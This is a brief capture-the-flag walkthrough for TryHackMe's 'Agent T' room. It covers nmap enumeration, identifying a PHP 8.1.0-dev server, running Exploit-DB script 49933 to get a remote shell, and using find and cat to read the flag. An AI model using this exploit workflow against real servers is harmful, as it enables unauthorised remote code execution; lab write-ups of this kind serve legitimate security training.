# Agent-T-Writeup
A step by step walk through for the Agent T CTF on Tryhackme

### Link : https://tryhackme.com/room/agentt

## Enumeration: 

We beging our enumeration with Nmap 

`└─$ nmap 10.10.197.199 -sV -sC
`



`
Starting Nmap 7.93 ( https://nmap.org )
`


`
PORT   STATE SERVICE VERSION
`




`
80/tcp open  http    PHP cli server 5.5 or later (PHP 8.1.0-dev)
`


`
|_http-title:  Admin Dashboard`

We see that the only port running is 80, visiting the website we are greeted by an admin dashboard template and that the server is running PHP 8.1.0

## Vulnerabilty hunting

Heading over to  https://www.exploit-db.com we find that PHP 8.1.0 is vulnerable to remote code execution by changing our user agent


CVE LINK: https://www.exploit-db.com/exploits/49933

We now download this using wget to our linux machine and run the program with python3

`python3 49933`


The script asks us for the host URL
 `Enter the full host url:
 `
 
 `
http://10.10.89.136`

This gives us a shell on the machine, now we can search for a flag

`find / -type f -name "flag.txt"`

We are given a location for the flag and we simply need to cat it

`cat <flag_location>`


### I HOPE THIS HELPS!!
